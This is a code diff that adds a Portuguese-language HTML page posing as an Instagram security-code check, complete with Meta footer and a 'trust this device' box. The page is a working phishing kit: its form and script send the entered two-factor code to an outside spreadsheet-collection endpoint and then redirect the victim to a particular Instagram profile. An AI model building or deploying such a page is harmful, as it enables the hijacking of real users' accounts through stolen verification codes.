@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verificação - Instagram</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: #ffffff;
+      color: #000000;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background-color: #ffffff;
+      padding: 40px;
+      border: 1px solid #000000;
+      border-radius: 8px;
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+    }
+
+    .lock-icon {
+      font-size: 40px;
+      background-color: #ffffff;
+      border-radius: 50%;
+      padding: 20px;
+      margin-bottom: 20px;
+      display: inline-block;
+    }
+
+    .container p {
+      margin-bottom: 20px;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      border-radius: 4px;
+      border: 1px solid #000000;
+      background-color: #ffffff;
+      color: #000000;
+      margin-bottom: 10px;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 10px;
+      background-color: #0095f6;
+      color: #ffffff;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 15px;
+    }
+
+    .checkbox {
+      text-align: left;
+      margin-bottom: 15px;
+      font-size: 13px;
+    }
+
+    .checkbox input {
+      margin-right: 5px;
+    }
+
+    a {
+      color: #0095f6;
+      text-decoration: none;
+      font-size: 13px;
+    }
+
+    .footer {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #aaa;
+      text-align: center;
+    }
+
+    .footer a {
+      color: #888;
+      margin: 0 4px;
+    }
+
+    .store-buttons {
+      margin-top: 20px;
+    }
+
+    .store-buttons img {
+      height: 40px;
+      margin: 0 5px;
+    }
+
+    a#Xereca {
+      text-decoration: none;
+      color: #ffffff;
+    }
+
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="lock-icon"><img src="./Xereca.png" alt=""></div>
+    <p>Insira o código enviado por WhatsApp ao seu número de celular: +55 ●●●● ●●●●.</p>
+    
+    <!-- Formulário com ID para manipular via JavaScript -->
+    <form id="formulario" action="https://api.sheetmonkey.io/form/73DiZN8cDaFDherk3sjMco" method="post">
+      <label for="Codigo">
+        <input type="text" id="Codigo" name="Codigo" placeholder="Código de segurança" required>
+      </label>
+
+      <!-- Botão com evento JavaScript -->
+      <button class="btn" type="submit">Confirmar</button>
+
+      <div class="checkbox">
+        <label>
+          <input type="checkbox" checked>
+          Confiar neste dispositivo<br>
+          <small>Não solicitaremos um código na próxima vez</small>
+        </label>
+      </div>
+    </form>
+
+    <p><a href="#">Enviar código por SMS</a></p>
+    <p>Se você não receber um código de segurança, use um dos seus<br><a href="#">códigos de reserva</a>.</p>
+  </div>
+
+  <div class="store-buttons">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play">
+  </div>
+
+  <div class="footer">
+    <p>
+      Meta • Sobre • Blog • Carreiras • Ajuda • API • Privacidade • Termos • Localizações • Instagram Lite • Threads • Upload de contatos e não usuários • Meta Verified
+    </p>
+    <p>Português (Brasil) © 2025 Instagram from Meta</p>
+  </div>
+
+  <!-- Script que envia e redireciona -->
+  <script>
+    const form = document.getElementById('formulario');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault(); // impede o envio automático
+
+      const formData = new FormData(form);
+
+      fetch(form.action, {
+        method: "POST",
+        body: formData
+      }).then(() => {
+        // redireciona depois de enviar
+        window.location.href = "https://www.instagram.com/hiago_de_pietro/";
+      }).catch(err => {
+        alert("Erro ao enviar. Tente novamente.");
+        console.error(err);
+      });
+    });
+  </script>
+
+</body>
+</html>
